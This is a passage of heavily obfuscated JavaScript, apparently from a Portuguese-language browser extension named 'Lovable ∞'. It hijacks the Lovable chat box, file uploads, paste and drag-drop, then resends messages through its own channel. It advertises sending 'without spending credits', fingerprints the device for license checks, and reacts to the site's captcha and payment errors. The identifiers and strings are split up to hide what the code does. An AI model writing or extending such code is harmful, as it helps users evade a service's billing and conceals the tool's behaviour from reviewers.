if(_n17236b<=_n4f2ed7||_nf3e044>=0x3)throw _n41017f;
await new Promise(_n1b2236=>setTimeout(_n1b2236,_n4f2ed7));
}
}
const _n26d5d5=0xa;
async function _n943df6(_n524101){
const _nd457e7=Array['fro'+'m'](_n524101||[])['sli'+'ce'](0x0,Math['max'](0x0,_n26d5d5-_n42a806['len'+'gth']));
if(!_nd457e7['len'+'gth'])return;
const _n3c0ef7=_nd457e7['map'](_n15d050=>{
const _n3a2d6e=(_n15d050['typ'+'e']||'')['sta'+'rts'+'Wit'+'h']('ima'+'ge/'),_n5a7ade=_n3a2d6e?URL['cre'+'ate'+'Obj'+'ect'+'URL'](_n15d050):null,_n3c347e={
'file_id':undefined,'file_name':_n15d050['nam'+'e'],'file_size':_nb05df1(_n15d050['siz'+'e']),'local_preview':_n5a7ade,'download_url':'','mime_type':_n15d050['typ'+'e']||'app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam','uploading':!![],'failed':![]}
;
_n42a806['pus'+'h'](_n3c347e);
const _n15dba4={
}
;
return _n15dba4['fil'+'e']=_n15d050,_n15dba4['ent'+'ry']=_n3c347e,_n15dba4;
}
);
_n1df40c(),_n2b21e9(),_na78c3(),await Promise['all'](_n3c0ef7['map'](async({
file:_n42eea0,entry:_n4e63a3}
)=>{
try{
const _n305caa=await _n3f6534(_n42eea0);
_n4e63a3['fil'+'e_i'+'d']=_n305caa['fil'+'e_i'+'d']||undefined,_n4e63a3['dow'+'nlo'+'ad_'+'url']=_n305caa['dow'+'nlo'+'ad_'+'url']||_n305caa['pub'+'lic'+'_ur'+'l']||_n4e63a3['loc'+'al_'+'pre'+'vie'+'w']||'',_n4e63a3['upl'+'oad'+'ing']=![];
}
catch(_n36eeee){
_n4e63a3['upl'+'oad'+'ing']=![],_n4e63a3['fai'+'led']=!![],_n1a4cc1('⚠\x20F'+'alh'+'a\x20n'+'o\x20u'+'plo'+'ad\x20'+'de\x20'+_n42eea0['nam'+'e']+':\x20'+(_n36eeee&&_n36eeee['mes'+'sag'+'e']||_n36eeee),![]);
}
_n1df40c(),_n2b21e9(),_na78c3();
}
));
}
function _n33f51b(){
const _n1db238=document['cre'+'ate'+'Ele'+'men'+'t']('inp'+'ut');
_n1db238['typ'+'e']='fil'+'e',_n1db238['mul'+'tip'+'le']=!![],_n1db238['sty'+'le']['dis'+'pla'+'y']='non'+'e',_n1db238['acc'+'ept']='ima'+'ge/'+'*,.'+'pdf'+',.d'+'oc,'+'.do'+'cx,'+'.xl'+'sx,'+'.xl'+'s,.'+'csv'+',.z'+'ip,'+'.tx'+'t,.'+'ppt'+'x',_n1db238['set'+'Att'+'rib'+'ute']('dat'+'a-q'+'l-p'+'ick'+'er','1'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n1db238),_n1db238['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cha'+'nge',async()=>{
const _n1ddc97=Array['fro'+'m'](_n1db238['fil'+'es']||[]);
_n1db238['rem'+'ove'](),await _n943df6(_n1ddc97);
}
),_n1db238['cli'+'ck']();
}
function _nb52cad(_n26b5c9){
if(!_n5c3fa8()){
_n4f7061();
return;
}
if(!_n1d9b8e||!_n3779d0)return;
const _n1bfbb6=_n26b5c9['tar'+'get'];
if(!_n1bfbb6||_n1bfbb6['typ'+'e']!=='fil'+'e')return;
if(_n1bfbb6['get'+'Att'+'rib'+'ute']('dat'+'a-q'+'l-p'+'ick'+'er')==='1')return;
const _n1026f7=Array['fro'+'m'](_n1bfbb6['fil'+'es']||[]);
if(!_n1026f7['len'+'gth'])return;
_n26b5c9['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion']();
try{
_n1bfbb6['val'+'ue']='';
}
catch(_n331cee){
}
const _n26ea82={
}
;
_n26ea82['key']='Esc'+'ape',_n26ea82['bub'+'ble'+'s']=!![],document['dis'+'pat'+'chE'+'ven'+'t'](new KeyboardEvent('key'+'dow'+'n',_n26ea82)),_n943df6(_n1026f7);
}
function _n1b8af6(_n240f81){
if(!_n5c3fa8()){
_n4f7061();
return;
}
if(!_n1d9b8e||!_n3779d0||!_n3779d0['con'+'tai'+'ns'](_n240f81['tar'+'get']))return;
const _n193956=_n240f81['cli'+'pbo'+'ard'+'Dat'+'a']&&_n240f81['cli'+'pbo'+'ard'+'Dat'+'a']['ite'+'ms']||[],_n46f049=[];
for(const _nde3198 of _n193956){
if(_nde3198['kin'+'d']==='fil'+'e'){
const _n5c4ad6=_nde3198['get'+'AsF'+'ile']();
if(_n5c4ad6)_n46f049['pus'+'h'](_n5c4ad6);
}
}
if(!_n46f049['len'+'gth'])return;
_n240f81['pre'+'ven'+'tDe'+'fau'+'lt'](),_n240f81['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_n943df6(_n46f049);
}
function _n528a6c(){
if(_n141a67)return;
const _n2afe3a=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n2afe3a['id']='__q'+'l_n'+'b_d'+'rop'+'hin'+'t__',_n2afe3a['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
di'+'spl'+'ay:'+'non'+'e!i'+'mpo'+'rta'+'nt;
'+'z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
'+('bac'+'kgr'+'oun'+'d:r'+'gba'+'(13'+'9,9'+'2,2'+'46,'+'.14'+')!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+':2p'+'x\x20d'+'ash'+'ed\x20'+'#8b'+'5cf'+'6!i'+'mpo'+'rta'+'nt;
')+('bor'+'der'+'-ra'+'diu'+'s:1'+'4px'+'!im'+'por'+'tan'+'t;
f'+'lex'+'-di'+'rec'+'tio'+'n:c'+'olu'+'mn!'+'imp'+'ort'+'ant'+';
')+('ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
g'+'ap:'+'6px'+'!im'+'por'+'tan'+'t;
')+('poi'+'nte'+'r-e'+'ven'+'ts:'+'non'+'e!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-f'+'ami'+'ly:'+'san'+'s-s'+'eri'+'f!i'+'mpo'+'rta'+'nt;
'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
');
const _n3d58cc=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n3d58cc['tex'+'tCo'+'nte'+'nt']='📥',_n3d58cc['sty'+'le']['css'+'Tex'+'t']='fon'+'t-s'+'ize'+':28'+'px!'+'imp'+'ort'+'ant'+';
';
const _na02480=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_na02480['tex'+'tCo'+'nte'+'nt']='Sol'+'te\x20'+'aqu'+'i\x20p'+'ara'+'\x20en'+'via'+'r\x20p'+'elo'+'\x20Lo'+'vab'+'le\x20'+'∞',_na02480['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-s'+'ize'+':13'+'px!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'wei'+'ght'+':70'+'0!i'+'mpo'+'rta'+'nt;
'+'tex'+'t-s'+'had'+'ow:'+'0\x201'+'px\x20'+'4px'+'\x20rg'+'ba('+'0,0'+',0,'+'.7)'+'!im'+'por'+'tan'+'t;
p'+'add'+'ing'+':0\x20'+'16p'+'x!i'+'mpo'+'rta'+'nt;
';
const _n3fe6c3=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n3fe6c3['tex'+'tCo'+'nte'+'nt']='sem'+'\x20ga'+'sta'+'r\x20c'+'réd'+'ito'+'s',_n3fe6c3['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'rgb'+'a(2'+'55,'+'255'+',25'+'5,.'+'75)'+'!im'+'por'+'tan'+'t;
f'+'ont'+'-si'+'ze:'+'11p'+'x!i'+'mpo'+'rta'+'nt;
'+'tex'+'t-s'+'had'+'ow:'+'0\x201'+'px\x20'+'3px'+'\x20rg'+'ba('+'0,0'+',0,'+'.7)'+'!im'+'por'+'tan'+'t;
',_n2afe3a['app'+'end'+'Chi'+'ld'](_n3d58cc),_n2afe3a['app'+'end'+'Chi'+'ld'](_na02480),_n2afe3a['app'+'end'+'Chi'+'ld'](_n3fe6c3),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n2afe3a),_n141a67=_n2afe3a;
}
function _n591638(){
_n141a67&&(_n141a67['rem'+'ove'](),_n141a67=null),_n388058=0x0;
}
function _n1fdc97(){
if(!_n141a67||!_n3779d0)return;
try{
const _n2da87a=_n3779d0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect'](),_nbf5abf=Math['max'](0x8,_n2da87a['top']-0x140);
_n141a67['sty'+'le']['top']=_nbf5abf+'px',_n141a67['sty'+'le']['lef'+'t']=_n2da87a['lef'+'t']+'px',_n141a67['sty'+'le']['wid'+'th']=_n2da87a['wid'+'th']+'px',_n141a67['sty'+'le']['hei'+'ght']=_n2da87a['bot'+'tom']-_nbf5abf+'px';
}
catch(_n39315b){
}
}
function _n371fbb(){
_n528a6c(),_n1fdc97();
if(_n141a67)_n141a67['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','fle'+'x','imp'+'ort'+'ant');
}
function _n3a0552(){
if(_n141a67)_n141a67['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','non'+'e','imp'+'ort'+'ant');
}
function _n46d7d2(_n1e46c4){
if(!_n1d9b8e)return;
_n1e46c4['pre'+'ven'+'tDe'+'fau'+'lt'](),_n1e46c4['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_n388058++;
if(_n388058===0x1)_n371fbb();
}
function _n3416eb(_n1ed3cc){
if(!_n1d9b8e)return;
_n1ed3cc['pre'+'ven'+'tDe'+'fau'+'lt'](),_n1ed3cc['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion']();
}
function _n250ea4(_n4543c1){
if(!_n1d9b8e)return;
_n4543c1['pre'+'ven'+'tDe'+'fau'+'lt'](),_n4543c1['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_n388058=Math['max'](0x0,_n388058-0x1);
if(_n388058===0x0)_n3a0552();
}
function _n41db29(_n33d3e9){
if(!_n5c3fa8()){
_n4f7061();
return;
}
if(!_n1d9b8e)return;
_n388058=0x0,_n3a0552();
const _n306059=_n33d3e9['dat'+'aTr'+'ans'+'fer']&&_n33d3e9['dat'+'aTr'+'ans'+'fer']['fil'+'es']||[];
if(!_n306059['len'+'gth'])return;
_n33d3e9['pre'+'ven'+'tDe'+'fau'+'lt'](),_n33d3e9['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_n943df6(Array['fro'+'m'](_n306059));
}
function _n1950e5(){
return new Promise(_n380bfa=>{
_n403e81(['__l'+'v_p'+'id'],async _n157a26=>{
const _n4542bd=_n157a26&&_n157a26['__l'+'v_p'+'id'];
if(!_n4542bd)return _n380bfa(null);
try{
const _n5aa8ba=navigator['use'+'rAg'+'ent']||'ua',_n5e1ef4=navigator['lan'+'gua'+'ge']||'lan'+'g',_n2d8811=navigator['pla'+'tfo'+'rm']||'pla'+'t',_n159f16=navigator['har'+'dwa'+'reC'+'onc'+'urr'+'enc'+'y']||0x0,_n253b4d=_n5aa8ba+'|'+_n5e1ef4+'|'+_n2d8811+'|'+_n159f16+'|'+_n4542bd,_n2c8f57=await crypto['sub'+'tle']['dig'+'est']('SHA'+'-25'+'6',new TextEncoder()['enc'+'ode'](_n253b4d)),_n208e1d=Array['fro'+'m'](new Uint8Array(_n2c8f57))['map'](_n51fe36=>_n51fe36['toS'+'tri'+'ng'](0x10)['pad'+'Sta'+'rt'](0x2,'0'))['joi'+'n']('');
console['log']('[Lo'+'vab'+'le∞'+']\x20h'+'wid'+'\x20(e'+'nvi'+'o):',_n208e1d['sli'+'ce'](0x0,0x8)+('...'+'\x20|\x20'+'pid'+':'),String(_n4542bd)['sli'+'ce'](0x0,0x8)+'...'),_n380bfa(_n208e1d);
}
catch(_n3dba0e){
_n380bfa(null);
}
}
),setTimeout(()=>{
if(!_n5c3fa8())_n380bfa(null);
}
,0x32);
}
);
}
async function _n3de6a5(){
if(!_n5c3fa8()){
_n4f7061(),_n1a4cc1('⚠\x20E'+'xte'+'nsã'+'o\x20r'+'eca'+'rre'+'gad'+'a\x20—'+'\x20at'+'ual'+'ize'+'\x20a\x20'+'pág'+'ina'+'\x20(F'+'5).',![]);
return;
}
if(_n411c15)return;
if(_n1147c3()){
_n1a4cc1('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20te'+'rmi'+'nar'+'...',![]);
return;
}
_n411c15=!![],await _n33f8a7();
const _n1317cf=_n5ef6ce()['tri'+'m'](),_n3c7c7a=_n42a806,_n19840f=_n3c7c7a['len'+'gth']>0x0?[..._n3c7c7a]:[..._n97878a(_n3779d0)];
if(!_n1317cf&&_n19840f['len'+'gth']===0x0){
_n411c15=![];
return;
}
const _n2ea1fd=_n3c2649(_n3779d0)==='pla'+'n',_n591260=_n2ea1fd?'Ent'+'er\x20'+'mod'+'o\x20P'+'lan'+':\x20\x22'+_n1317cf+'\x22':_n1317cf;
_n4e6991(''),_n42a806=[],_n1df40c(),_n2b21e9(),_na78c3();
try{
const _n1de312=await _n1950e5(),_n1d23a9=Date['now']()+0x61a8;
let _n252af7=0x0,_n93c2e6=null,_ndaccd1=![];
while(!![]){
_n252af7++;
if(_n252af7>0x1)await _n33f8a7();
if(isTokenExpired(readTokenFromLocalStorage()))_n93c2e6='Ses'+'são'+'\x20do'+'\x20Lo'+'vab'+'le\x20'+'exp'+'ira'+'da.'+'\x20Re'+'car'+'reg'+'ue\x20'+'a\x20a'+'ba\x20'+'do\x20'+'Lov'+'abl'+'e\x20('+'F5)'+'\x20e\x20'+'ten'+'te\x20'+'nov'+'ame'+'nte'+'.';
else{
const _n2679f3=await new Promise(_n521873=>{
const _n23e752={
}
;
_n23e752['act'+'ion']='sen'+'dMe'+'ssa'+'ge',_n23e752['mes'+'sag'+'e']=_n591260,_n23e752['att'+'ach'+'men'+'ts']=_n19840f,_n23e752['dev'+'ice'+'Fin'+'ger'+'pri'+'nt']=_n1de312||undefined,_n252730(_n23e752,_n521873);
}
);
if(_n2679f3&&(_n2679f3['ok']||_n2679f3['suc'+'ces'+'s'])){
_ndaccd1=!![];
break;
}
_n93c2e6=_n2679f3&&_n2679f3['err'+'or']||'Fal'+'ha\x20'+'ao\x20'+'env'+'iar'+'.\x20T'+'ent'+'e\x20n'+'ova'+'men'+'te.';
if(/license_invalid:|captcha_required|payment_required/i['tes'+'t'](_n93c2e6))break;
}
const _n2a3421=_n1d23a9-Date['now'](),_n40e71e=/429|http_429/i['tes'+'t'](_n93c2e6)?0xbb8:0x5dc;
if(_n2a3421<=_n40e71e||_n252af7>=0x4)break;
await new Promise(_n2d225d=>setTimeout(_n2d225d,_n40e71e));
}
if(_ndaccd1)_n1a4cc1('✓\x20E'+'nvi'+'ado'+'\x20se'+'m\x20g'+'ast'+'ar\x20'+'cré'+'dit'+'os',!![]);
else{
const _n150ecd=/hwid_mismatch:/i['tes'+'t'](_n93c2e6||''),_nff79e5=/captcha_required/i['tes'+'t'](_n93c2e6||''),_n15f2f2=/payment_required/i['tes'+'t'](_n93c2e6||'');
if(_nff79e5)_n1a4cc1('🤖\x20A'+'\x20Lo'+'vab'+'le\x20'+'ped'+'iu\x20'+'ver'+'ifi'+'caç'+'ão\x20'+'de\x20'+'seg'+'ura'+'nça'+'\x20(c'+'apt'+'cha'+').\x20'+'Des'+'ati'+'ve\x20'+'a\x20e'+'xte'+'nsã'+'o,\x20'+'man'+'de\x20'+'uma'+'\x20me'+'nsa'+'gem'+'\x20si'+'mpl'+'es\x20'+'(ex'+':\x20u'+'m\x20p'+'ont'+'o\x20\x22'+'.\x22)'+'\x20pe'+'lo\x20'+'cha'+'t\x20n'+'ati'+'vo\x20'+'do\x20'+'Lov'+'abl'+'e\x20p'+'ra\x20'+'res'+'olv'+'er,'+'\x20de'+'poi'+'s\x20r'+'eat'+'ive'+'\x20e\x20'+'ten'+'te\x20'+'de\x20'+'nov'+'o.',![],0x2ee0);
else _n15f2f2?_n1a4cc1('💳\x20W'+'ork'+'spa'+'ce\x20'+'sem'+'\x20cr'+'édi'+'tos'+'.\x20V'+'ocê'+'\x20pr'+'eci'+'sa\x20'+'de\x20'+'pel'+'o\x20m'+'eno'+'s\x201'+'\x20cr'+'édi'+'to\x20'+'(po'+'de\x20'+'usa'+'r\x20o'+'s\x205'+'\x20gr'+'áti'+'s\x20d'+'iár'+'ios'+'\x20da'+'\x20Lo'+'vab'+'le)'+'\x20pr'+'a\x20e'+'xte'+'nsã'+'o\x20f'+'unc'+'ion'+'ar.',![],0x2328):_n1a4cc1(_n150ecd?'⚠\x20H'+'ard'+'war'+'e\x20I'+'D\x20n'+'ão\x20'+'con'+'fer'+'e\x20('+'pod'+'e\x20o'+'cor'+'rer'+'\x20at'+'é\x20n'+'o\x20m'+'esm'+'o\x20P'+'C).'+'\x20Ab'+'ra\x20'+'a\x20e'+'xte'+'nsã'+'o\x20L'+'ova'+'ble'+'\x20∞\x20'+'e\x20r'+'ese'+'te\x20'+'na\x20'+'tel'+'a\x20d'+'e\x20l'+'ogi'+'n.':'⚠\x20'+_n93c2e6,![]);
/license_invalid:/i['tes'+'t'](_n93c2e6||'')?_n296b2b():(_n4e6991(_n1317cf),_n42a806=_n3c7c7a,_n1df40c(),_n2b21e9(),_na78c3());
}
}
catch(_n3504eb){
_n1a4cc1('⚠\x20E'+'rro'+'\x20ao'+'\x20en'+'via'+'r',![]),_n4e6991(_n1317cf),_n42a806=_n3c7c7a,_n1df40c(),_n2b21e9(),_na78c3();
}
finally{
_n411c15=![];
}
}
function _n3ead81(){
if(_n42a806['len'+'gth']>0x0)return!![];
if(!_n3779d0)return![];
for(const _n1618c3 of _n3779d0['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('img')){
try{
const _n3d35ef=_n1618c3['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n3d35ef['wid'+'th']>=0x14&&_n3d35ef['hei'+'ght']>=0x14)return!![];
}
catch(_n1f7edc){
}
}
return![];
}
function _n22248d(){
if(!_n849915||!_n3779d0)return;
if(!_n5ef6ce()['tri'+'m']()&&!_n3ead81()){
_n849915['sty'+'le']['dis'+'pla'+'y']='non'+'e';
return;
}
const _n4952f0=_n34a31d(_n3779d0);
if(!_n4952f0){
_n849915['sty'+'le']['dis'+'pla'+'y']='non'+'e';
return;
}
try{
const _n2b77cb=_n4952f0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n2b77cb['wid'+'th']===0x0||_n2b77cb['hei'+'ght']===0x0){
_n849915['sty'+'le']['dis'+'pla'+'y']='non'+'e';
return;
}
_n849915['sty'+'le']['dis'+'pla'+'y']='blo'+'ck',_n849915['sty'+'le']['top']=_n2b77cb['top']+'px',_n849915['sty'+'le']['lef'+'t']=_n2b77cb['lef'+'t']+'px',_n849915['sty'+'le']['wid'+'th']=_n2b77cb['wid'+'th']+'px',_n849915['sty'+'le']['hei'+'ght']=_n2b77cb['hei'+'ght']+'px';
}
catch(_n5e36a3){
}
}
function _n570662(){
if(_n849915)return;
const _nfb3d02=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_nfb3d02['id']='__q'+'l_n'+'b_o'+'ver'+'lay'+'__',_nfb3d02['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
di'+'spl'+'ay:'+'non'+'e!i'+'mpo'+'rta'+'nt;
'+'bac'+'kgr'+'oun'+'d:t'+'ran'+'spa'+'ren'+'t!i'+'mpo'+'rta'+'nt;
'+('cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
z-'+'ind'+'ex:'+'214'+'748'+'364'+'6!i'+'mpo'+'rta'+'nt;
'),_nfb3d02['tit'+'le']='Env'+'iar'+'\x20se'+'m\x20g'+'ast'+'ar\x20'+'cré'+'dit'+'os\x20'+'(Lo'+'vab'+'le\x20'+'∞)';
let _n425397=![];
const _n2cdf45={
}
;
_n2cdf45['pas'+'siv'+'e']=![],_nfb3d02['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'chs'+'tar'+'t',_n2c1d60=>{
_n425397=!![],_n2c1d60['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2c1d60['sto'+'pPr'+'opa'+'gat'+'ion']();
}
,_n2cdf45);
const _n63374e={
}
;
_n63374e['pas'+'siv'+'e']=!![],_nfb3d02['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'chm'+'ove',()=>{
_n425397=![];
}
,_n63374e);
const _n364b4b={
}
;
_n364b4b['pas'+'siv'+'e']=![],_nfb3d02['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'che'+'nd',_n38163d=>{
if(!_n425397)return;
_n425397=![],_n38163d['pre'+'ven'+'tDe'+'fau'+'lt'](),_n38163d['sto'+'pPr'+'opa'+'gat'+'ion']();
if(_n1147c3()){
_n1a4cc1('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20te'+'rmi'+'nar'+'...',![]);
return;
}
_n3de6a5();
}
,_n364b4b),_nfb3d02['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n86a2c=>{
_n86a2c['pre'+'ven'+'tDe'+'fau'+'lt'](),_n86a2c['sto'+'pPr'+'opa'+'gat'+'ion']();
if(_n1147c3()){
_n1a4cc1('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20te'+'rmi'+'nar'+'...',![]);
return;
}
_n3de6a5();
}
),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_nfb3d02),_n849915=_nfb3d02;
}
function _n441e06(){
_n4f3c7f&&(_n4f3c7f['dis'+'con'+'nec'+'t'](),_n4f3c7f=null),_n849915&&(_n849915['sty'+'le']['dis'+'pla'+'y']='non'+'e'),_n5a8956();
}
let _n24799f=0x0;
function _n2abf35(_n231b1){
if(!_n1d9b8e){
_nd68324=null;
return;
}
(!_n231b1||_n231b1-_n24799f>=0x3c)&&(_n24799f=_n231b1||0x0,_n22248d()),_nd68324=requestAnimationFrame(_n2abf35);
}
function _n299647(){
if(_nd68324)return;
_nd68324=requestAnimationFrame(_n2abf35);
}
function _n5a8956(){
_nd68324&&(cancelAnimationFrame(_nd68324),_nd68324=null),_n24799f=0x0;
}
function _n2d3804(_n1c5b6f){
if(!_n5c3fa8()){
_n4f7061();
return;
}
if(!_n1d9b8e||!_n3779d0||!_n3779d0['con'+'tai'+'ns'](_n1c5b6f['tar'+'get']))return;
const _n449e5f=_n1c5b6f['tar'+'get']&&_n1c5b6f['tar'+'get']['tag'+'Nam'+'e'],_n3e7271=_n449e5f==='TEX'+'TAR'+'EA'||_n1c5b6f['tar'+'get']&&_n1c5b6f['tar'+'get']['isC'+'ont'+'ent'+'Edi'+'tab'+'le'];
if(!_n3e7271)return;
if(_n1c5b6f['key']==='Ent'+'er'&&!_n1c5b6f['shi'+'ftK'+'ey']){
_n1c5b6f['pre'+'ven'+'tDe'+'fau'+'lt'](),_n1c5b6f['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion']();
if(_n1147c3()){
_n1a4cc1('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20te'+'rmi'+'nar'+'...',![]);
return;
}
_n3de6a5();
}
}
function _n5550c4(){
if(!_n5c3fa8()){
_n4f7061();
return;
}
const _n29fece=_qlFindChatPanel();
if(_n29fece===_n3779d0){
_n470f14();
if(_n1d9b8e)_n22248d();
if(_n1d9b8e)_n2fbbad();
return;
}
if(_n3779d0)_nf0b1c6(![]);
_n3779d0=_n29fece;
if(_n1d9b8e)_nf0b1c6(!![]);
_n470f14();
if(_n1d9b8e)_n22248d();
if(_n1d9b8e)_n2fbbad();
_n2cac60&&(_n2cac60['dis'+'con'+'nec'+'t'](),_n2cac60=null),_n29fece&&(_n2cac60=new ResizeObserver(()=>{
_n470f14();
if(_n1d9b8e)_n22248d();
}
),_n2cac60['obs'+'erv'+'e'](_n29fece));
}
function _n517dd9(_n13b893){
const _n3eafe1=_n13b893?'#22'+'c55'+'e':'#ef'+'444'+'4',_n50857e=_n13b893?'rgb'+'a(3'+'4,1'+'97,'+'94,'+'.35'+')':'rgb'+'a(2'+'39,'+'68,'+'68,'+'.35'+')';
_ne2eca8&&(_ne2eca8['sty'+'le']['set'+'Pro'+'per'+'ty']('bor'+'der'+'-co'+'lor',_n3eafe1,'imp'+'ort'+'ant'),_n13b893?_ne2eca8['sty'+'le']['set'+'Pro'+'per'+'ty']('ani'+'mat'+'ion','__q'+'l_p'+'uls'+'e\x202'+'s\x20e'+'ase'+'-in'+'-ou'+'t\x20i'+'nfi'+'nit'+'e','imp'+'ort'+'ant'):(_ne2eca8['sty'+'le']['set'+'Pro'+'per'+'ty']('ani'+'mat'+'ion','non'+'e','imp'+'ort'+'ant'),_ne2eca8['sty'+'le']['set'+'Pro'+'per'+'ty']('box'+'-sh'+'ado'+'w','0\x200'+'\x200\x20'+'3px'+'\x20'+_n50857e+(',0\x20'+'4px'+'\x2016'+'px\x20'+'rgb'+'a(0'+',0,'+'0,.'+'5)'),'imp'+'ort'+'ant')));
if(_n2c6956)_n2c6956['sty'+'le']['set'+'Pro'+'per'+'ty']('bac'+'kgr'+'oun'+'d',_n3eafe1,'imp'+'ort'+'ant');
}
function _n768517(_n4a9167){
_n1d9b8e=_n4a9167;
const _n5570f4={
}
;
_n5570f4[_n3f8ab0]=_n4a9167,_n541a20(_n5570f4),_n517dd9(_n4a9167),_n3432e6(_n4a9167),_n5550c4(),_nf0b1c6(_n4a9167);
try{
const _n26332f={
}
;
_n26332f['typ'+'e']='__Q'+'L_S'+'ET_'+'GUA'+'RD_'+'_',_n26332f['blo'+'ck']=!_n4a9167,window['pos'+'tMe'+'ssa'+'ge'](_n26332f,'*');
}
catch(_n3b84f7){
}
if(_n4a9167)_n570662(),_n22248d(),_n299647(),_n2fbbad(),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n2d3804,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n4bbcf4,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cha'+'nge',_nb52cad,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('pas'+'te',_n1b8af6,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gen'+'ter',_n46d7d2,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gov'+'er',_n3416eb,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gle'+'ave',_n250ea4,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dro'+'p',_n41db29,!![]);
else{
_n441e06();
const _n12cd28=document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_i'+'mpr'+'ove'+'_bt'+'n__');
if(_n12cd28)_n12cd28['rem'+'ove']();
document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n2d3804,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n4bbcf4,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cha'+'nge',_nb52cad,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('pas'+'te',_n1b8af6,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gen'+'ter',_n46d7d2,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gov'+'er',_n3416eb,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gle'+'ave',_n250ea4,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dro'+'p',_n41db29,!![]),_n591638();
}
}
function _n110f58(_n443bb3){
if(document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_n'+'b_c'+'onf'+'irm'+'__'))return;
const _n33fd74=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n33fd74['id']='__q'+'l_n'+'b_c'+'onf'+'irm'+'__',_n33fd74['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
in'+'set'+':0!'+'imp'+'ort'+'ant'+';
ba'+'ckg'+'rou'+'nd:'+'rgb'+'a(0'+',0,'+'0,.'+'6)!'+'imp'+'ort'+'ant'+';
'+('z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
d'+'isp'+'lay'+':fl'+'ex!'+'imp'+'ort'+'ant'+';
al'+'ign'+'-it'+'ems'+':ce'+'nte'+'r!i'+'mpo'+'rta'+'nt;
')+('jus'+'tif'+'y-c'+'ont'+'ent'+':ce'+'nte'+'r!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-f'+'ami'+'ly:'+'san'+'s-s'+'eri'+'f!i'+'mpo'+'rta'+'nt;
');
